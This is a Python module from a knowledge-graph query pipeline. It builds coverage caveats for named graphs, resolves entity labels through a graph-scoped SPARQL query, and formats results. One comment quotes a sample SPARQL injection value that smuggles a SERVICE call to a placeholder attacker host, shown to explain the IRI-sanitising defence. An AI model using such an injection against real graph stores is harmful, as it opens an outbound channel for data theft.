"""KG coverage caveat and answer formatting for NLQueryPipeline."""
from __future__ import annotations

import json
import os
import re
import time
from typing import Any, Iterable

import httpx
import structlog

from infona_client.graph.iri import ENTITY_URI_PREFIX, IRI_BASE, TYPE_URI_PREFIX
from infona_client.graph.parser import parse_sparql_results, unbound_projection_vars
from infona_client.graph.queries import parse_kg_graph_uri, skip_invalid_type_name
from infona_client.graph.sparql_scope import (
    CrossTenantQueryError,
    confine_generated_query,
    tenant_of_graph,
)
from infona_client.models.query import NLResult
from infona_client.nlp.cypher_generate import (
    neo4j_ask_enabled,
    ontology_from_graph_store,
    records_to_bindings,
)
from infona_client.nlp.cypher_scope import (
    CrossTenantCypherError,
    CypherScopeError,
    confine_generated_cypher,
    scrub_cypher_error,
)
from infona_client.nlp.pipeline_helpers import (
    ACTIVE_TYPE_PROBE_CHUNK,
    ANSWER_ROW_CAP,
    MAX_ACTIVE_TYPE_PROBE_CONCURRENCY,
    MAX_ACTIVE_TYPE_PROBE_URIS,
    MAX_ENUM_DISCOVERY_CONCURRENCY,
    ONTOLOGY_CACHE_TTL,
    ONTOLOGY_EMPTY,
    ONTOLOGY_FETCH_ERROR,
    RDF_TYPE_URI,
    _GEO_WKT_URI,
    _active_types_cache,
    _active_types_cache_key,
    _alias_cache,
    _cypher_uses_forbidden_shapes,
    _drop_internal_predicate_rows,
    _is_interpolatable_iri,
    _missing_template_params,
    _neptune_safe_duration,
    _ontology_cache,
    _parse_iso_dt,
    _parse_point_wkt,
    _prefer_attr_name_over_rdfs_label,
    _sanitize_sparql_literal,
    _store_active_types,
)
from infona_client.nlp.pipeline_llm import (
    CEREBRAS_LENGTH_RECOVERY_TOKENS,
    OPENROUTER_BASE,
    OPENROUTER_QUERY_TIMEOUT_S,
    OPENROUTER_REASONING_MAX_TOKENS,
    EmptyLLMResponse,
    _is_reasoning_query_model,
    _openrouter_base,
    _parse_sparql_gen_json,
    _require_message_content,
    get_embedding_service,
)
from infona_client.nlp.prompts import (
    CYPHER_GENERATION_SYSTEM,
    SPARQL_GENERATION_SYSTEM,
    build_cypher_generation_prompt,
    build_generation_prompt,
)
from infona_client.nlp.validator import normalize_sparql, validate_sparql
from infona_client.nlp.token_usage import (
    STAGE_REPHRASE,
    TokenUsageLedger,
    attach_usage,
    pop_attached_usage,
    stage_for_attempt,
)
from infona_client.offline import assert_online_url
from infona_client.resolver.llm_router import model_chain
from infona_client.spatiotemporal.routing import (
    SPATIAL_INTENT_SCHEMA,
    SPATIAL_INTENT_SYSTEM,
    filter_by_type,
    format_spatial_answer,
    looks_spatial,
    parse_spatial_intent,
)

logger = structlog.stdlib.get_logger("infona.nlp.pipeline")


class PipelineFormatMixin:
    # ------------------------------------------------------- KG coverage caveat

    async def _kg_coverage_caveat(
        self,
        sparql: str,
        ontology: str,
        data_graph: str,
        ontology_graph: str,
        layer_graph_uris: list[str] | None,
        declared_names: list[str] | None,
        active_types: set[str] | None,
        ontology_source: str,
        timing: dict,
        query_params: dict | None = None,
    ) -> str:
        """One sentence when the NAMED KG holds none of the types the query read.

        ONTA-454. The generated dataset is a union of the KG graph, the tenant
        base graph and the Global layers, so a question asked about ONE knowledge
        graph can be answered entirely out of the others and read as though it
        came from the named one. See ``nlp/kg_coverage.py`` for why a narrower
        dataset is not available as a fix and why a refusal would be wrong.

        Returns ``""`` — silently, on every degenerate input — when:

        * no KG was named (``data_graph`` is the tenant graph itself, the
          ``kg_name``-less workspace whose data legitimately IS the base graph);
        * nothing is marked ``[no instances]`` for this KG, so there is no signal;
        * the executed query names no type URI, so there is nothing to check; or
        * every type it named does have instances here.

        COST. The common path adds ZERO round-trips: it compares two values the
        caller already holds (the ontology summary the planner saw, whose
        ``[no instances]`` marks are already resolved per-KG, and the query that
        ran). ONE bounded probe fires only when a caveat is otherwise about to be
        emitted, to settle subclass closure — ``[no instances]`` is a DIRECT
        ``rdf:type`` fact while the query walks ``rdf:type/rdfs:subClassOf*``, so
        without it a KG holding only ``Facility`` rows would be wrongly told it
        has no ``Organization`` data. That probe can only SUPPRESS a caveat, so a
        failure degrades to the direct-type verdict the planner was already shown,
        never to a fabricated one.

        Best-effort throughout: any unexpected failure returns ``""`` rather than
        breaking an answer that is otherwise ready to return.
        """
        try:
            if not data_graph or data_graph == ontology_graph:
                return ""
            from infona_client.graph.kg_status import other_graphs_hold_instances
            from infona_client.graph.queries import parse_kg_graph_uri
            from infona_client.nlp.kg_coverage import (
                MAX_UNCOVERED_TYPES,
                coverage_caveat,
                empty_types_for_kg,
                referenced_types,
                undetermined_caveat,
                unscoped_caveat,
                uncovered_types,
            )

            scope = parse_kg_graph_uri(data_graph)
            if not scope:
                return ""
            tenant_id, kg_name = scope
            # EVERY non-KG graph the answer query read, which is precisely the set
            # of extra FROM clauses `add_layer_from_clauses` spliced in. Asking
            # only about the tenant base graph would miss the shared Global
            # layers, which demonstrably hold instance data (see
            # `other_graphs_hold_instances`).
            other_graphs = [
                g
                for g in (list(layer_graph_uris) if layer_graph_uris else [ontology_graph])
                if g and g != data_graph
            ]

            # SIGNAL B, the type-UNANCHORED query. `?s rdf:type ?type` with an
            # unbound type constrains nothing, so it reads the whole union and no
            # type-based signal can speak about it. Measured on production
            # 2026-08-03: "how many rows of data are there in total?" against a
            # KG of 8 subjects answered 19582. Only worth saying when the union
            # really does hold data outside the named graph, which is one
            # positive-cached O(1) ASK (and which fails toward silence).
            referenced = referenced_types(sparql)
            # Cypher templates rarely embed type IRIs; fall back to gen params.
            if not referenced and query_params:
                from infona_client.graph.iri import IRI_BASE as _IRI

                synthetic: dict[str, list[str]] = {}
                for tn in query_params.get("type_names") or []:
                    if isinstance(tn, str) and tn.strip():
                        synthetic[tn.strip()] = [f"{_IRI}/types/{tn.strip()}"]
                pt = query_params.get("primary_type")
                if isinstance(pt, str) and pt.strip():
                    synthetic[pt.strip()] = [f"{_IRI}/types/{pt.strip()}"]
                referenced = synthetic
            if not referenced:
                if not await other_graphs_hold_instances(
                    self.neptune, tenant_id, other_graphs
                ):
                    return ""
                timing["kg_coverage_unscoped_query"] = 1.0
                logger.info("kg_coverage_unscoped_query", kg_name=kg_name)
                return unscoped_caveat(kg_name)

            # SIGNAL A, the type-anchored query.
            empty_in_kg = empty_types_for_kg(
                ontology, declared_names=declared_names, active_types=active_types
            )
            if not empty_in_kg:
                # No marks. Usually that means every declared type IS populated
                # here, which is the honest silent case. But on the SEMANTIC path
                # `ontology_embeddings` marks nothing at all when the ONTA-411
                # active-type probe failed, and that same failure un-scopes
                # retrieval, so the subset may be a SIBLING KG's schema. Absence of
                # marks then means "not measured", not "all covered", and silence
                # would hide exactly the leak the WARNING log already reports.
                if ontology_source == "semantic" and active_types is None:
                    if not await other_graphs_hold_instances(
                        self.neptune, tenant_id, other_graphs
                    ):
                        return ""
                    timing["kg_coverage_undetermined"] = 1.0
                    logger.info("kg_coverage_undetermined", kg_name=kg_name)
                    return undetermined_caveat(kg_name)
                return ""
            flagged, all_types = uncovered_types(referenced, empty_in_kg)
            if not flagged:
                return ""
            # Cap BEFORE probing, so the sentence only ever names types the
            # confirmation probe actually cleared. Sorted so the choice is
            # deterministic rather than regex-match order.
            flagged = dict(sorted(flagged.items())[:MAX_UNCOVERED_TYPES])
            probed = set(flagged)

            present = await self._types_present_in_kg(
                data_graph, ontology_graph, layer_graph_uris, flagged
            )
            flagged = {n: u for n, u in flagged.items() if n not in present}
            if not flagged:
                return ""
            # `all_types` was computed from the "[no instances]" MARKS, before the
            # probe had a chance to disagree with them. If the probe CLEARED any
            # type, the marks were wrong about at least one, and the strong
            # sentence ("the only type this query reads ... not an answer about
            # this graph") becomes a false claim about a graph the probe just
            # proved does hold one of the query's types. Demote to the partial
            # wording. Truncation by the cap alone is NOT a demotion: those types
            # are still uncovered, they are merely not all listed.
            if probed - set(flagged):
                all_types = False

            timing["kg_coverage_uncovered_types"] = ", ".join(sorted(flagged))
            logger.info(
                "kg_coverage_caveat",
                kg_name=kg_name,
                uncovered=sorted(flagged),
                all_referenced_types=all_types,
            )
            return coverage_caveat(kg_name, list(flagged), all_types=all_types)
        except Exception:  # noqa: BLE001 - an advisory note must never fail an answer
            logger.warning("kg_coverage_caveat_failed", exc_info=True)
            return ""

    async def _types_present_in_kg(
        self,
        data_graph: str,
        ontology_graph: str,
        layer_graph_uris: list[str] | None,
        flagged: dict[str, list[str]],
    ) -> set[str]:
        """Names among ``flagged`` that DO have an instance in ``data_graph``.

        Subclass-aware, which is the whole reason it exists (see
        :meth:`_kg_coverage_caveat`). Returns an empty set on any failure, i.e.
        suppresses nothing, leaving the direct-``rdf:type`` verdict the ontology
        summary already carried. The failure is logged at WARNING because the
        cost of silence here is a caveat that could be wrong, and its only other
        trace would be a `timing` key in a response body.
        """
        from infona_client.graph.layers import type_name_from_uri
        from infona_client.nlp.kg_coverage import kg_subtype_presence_query

        probe_uris = [uri for uris in flagged.values() for uri in uris]
        if not probe_uris:
            return set()
        ontology_graphs = list(layer_graph_uris) if layer_graph_uris else [ontology_graph]
        present: set[str] = set()
        try:
            raw = await self.neptune.query(
                kg_subtype_presence_query(data_graph, ontology_graphs, probe_uris)
            )
            _, rows = parse_sparql_results(raw)
        except Exception:
            logger.warning(
                "kg_coverage_subtype_probe_failed",
                instance_graph=data_graph,
                exc_info=True,
            )
            return set()
        for row in rows:
            name = type_name_from_uri(row.get("type", ""))
            if name:
                present.add(name)
        return present

    @staticmethod
    def _humanize_uri(uri: str) -> str:
        """Extract a human-readable name from an Infona URI.

        Examples:
            https://graph.infona.ai/entities/Movie/12345 → 12345
            https://graph.infona.ai/types/Movie → Movie
            https://graph.infona.ai/entities/ConsumerComplaint/1431838 → 1431838
        """
        from urllib.parse import unquote
        path = unquote(uri.replace(f"{IRI_BASE}/", ""))
        return path.split("/")[-1]

    async def _resolve_uri_labels(
        self, bindings: list[dict], data_graph: str | None = None
    ) -> dict[str, str]:
        """Batch-resolve rdfs:label for all Infona entity/type URIs in bindings.

        Returns a mapping from URI → human-readable label.
        Falls back to extracting the last URI path segment if no label is found.

        ONTA-424: ``data_graph`` scopes the lookup. This query named no graph,
        and on Neptune that means the union of every named graph on the
        instance. It is not generated SPARQL, but it is the same leak: entity
        IRIs are minted from the TYPE and the value
        (``entities/<Type>/<safe_id>``, see ``graph/ontology_queries.py``) with
        no tenant segment, so two workspaces holding the same real-world thing
        mint the SAME IRI. An unscoped ``VALUES ?uri { … } ?uri rdfs:label
        ?label`` therefore returns whatever label ANOTHER workspace attached to
        that IRI, and the answer renders it as ours.
        """
        # Collect all unique URIs that look like Infona entities or types.
        #
        # The prefix test alone is NOT enough to interpolate a value into
        # `<{u}>`. `parse_sparql_results` flattens every binding to its `.value`
        # string, so a LITERAL is indistinguishable from an IRI here — and a
        # literal is arbitrary text the workspacef's own ingest put in the graph.
        # A value that merely STARTS with the entities prefix and then carries
        # `>` closes the IRI early, and the rest of it becomes query syntax:
        #
        #     https://graph.infona.ai/entities/X> } SERVICE <http://attacker/> { … } }#
        #
        # parses cleanly and gives the attacker an outbound SERVICE call from
        # inside the VPC. That is the same channel rule C rejects on the raw
        # route. `_is_interpolatable_iri` applies the SPARQL IRIREF grammar's own
        # exclusion set, so nothing that could terminate or escape the IRI is
        # ever interpolated. Dropping a value only costs it a label (the
        # `_humanize_uri` fallback below still names it).
        uris: set[str] = set()
        for row in bindings:
            for v in row.values():
                if not isinstance(v, str):
                    continue
                if not (
                    v.startswith(ENTITY_URI_PREFIX)
                    or v.startswith(TYPE_URI_PREFIX)
                ):
                    continue
                if not _is_interpolatable_iri(v):
                    logger.warning(
                        "label_lookup_skipped_unsafe_value", value_prefix=v[:60]
                    )
                    continue
                uris.add(v)

        if not uris:
            return {}

        resolved: dict[str, str] = {}

        # Batch SPARQL query to fetch rdfs:label for all URIs at once
        values_clause = " ".join(f"<{u}>" for u in uris)
        scope = f"FROM <{data_graph}> " if data_graph else ""
        label_query = (
            f"SELECT ?uri ?label {scope}WHERE {{ "
            f"VALUES ?uri {{ {values_clause} }} "
            f"?uri <http://www.w3.org/2000/01/rdf-schema#label> ?label . "
            f"}}"
        )
        try:
            raw = await self.neptune.query(label_query)
            _, label_bindings = parse_sparql_results(raw)
            for row in label_bindings:
                uri = row.get("uri", "")
                label = row.get("label", "")
                if uri and label:
                    resolved[uri] = label
        except Exception:
            logger.debug("uri_label_resolution_failed", uri_count=len(uris), exc_info=True)

        # Fall back to path extraction for any URIs that weren't resolved
        for uri in uris:
            if uri not in resolved:
                resolved[uri] = self._humanize_uri(uri)

        return resolved

    async def _format_answer(
        self,
        bindings: list[dict],
        explanation: str,
        missing_vars: list[str] | None = None,
        data_graph: str | None = None,
    ) -> str:
        # `missing_vars` are projected columns that bound in zero rows — reported
        # honestly (see `unbound_projection_vars`) so the caller can tell "column
        # absent" from "column empty" rather than the value silently vanishing.
        def _missing_note() -> str:
            if not missing_vars:
                return ""
            cols = ", ".join(missing_vars)
            return (
                f"\n\nNote: requested {'column' if len(missing_vars) == 1 else 'columns'} "
                f"[{cols}] not present on any matching entity — the attribute may be "
                f"unpopulated or named differently."
            )

        if not bindings:
            # Even with no rows, surface which requested columns are absent so a
            # follow-up can re-resolve rather than assume "no data at all".
            return "No results found." + _missing_note()

        # Hygiene: drop rows describing internal/housekeeping predicates
        # (`er/blockKey`, `er/erSignal_*`, `onto/batch_id`, `onto/norm/*`, …) so a
        # "describe this entity" / "list all predicates" query never leaks ER /
        # ingest plumbing as business data. Real relationships on `…/onto/<leaf>`
        # are preserved. This mirrors the Explorer panel filter via the SAME
        # shared `is_internal_predicate` helper.
        bindings = _drop_internal_predicate_rows(bindings)
        if not bindings:
            # Every row was internal plumbing — there is no user-facing data to
            # show. Report empty rather than emitting the internal predicates.
            return "No results found." + _missing_note()

        # Resolve any entity/type URIs to human-readable labels
        uri_labels = await self._resolve_uri_labels(bindings, data_graph)

        def _display(value: str) -> str:
            """Return the display form of a binding value, resolving URIs."""
            return uri_labels.get(value, value)

        if len(bindings) == 1 and len(bindings[0]) == 1 and not missing_vars:
            value = list(bindings[0].values())[0]
            return _display(str(value))

        total = len(bindings)
        cap = ANSWER_ROW_CAP
        lines = []
        if total > cap:
            # State truncation PROMINENTLY up front, not buried after the rows.
            lines.append(f"Showing first {cap} of {total} results (truncated):")
        for row in bindings[:cap]:
            parts = [f"{k}: {_display(v)}" for k, v in row.items()]
            lines.append(", ".join(parts))
        result = "\n".join(lines)
        if total > cap:
            result += f"\n(… {total - cap} more results not shown — refine the question to narrow them.)"
        return result + _missing_note()
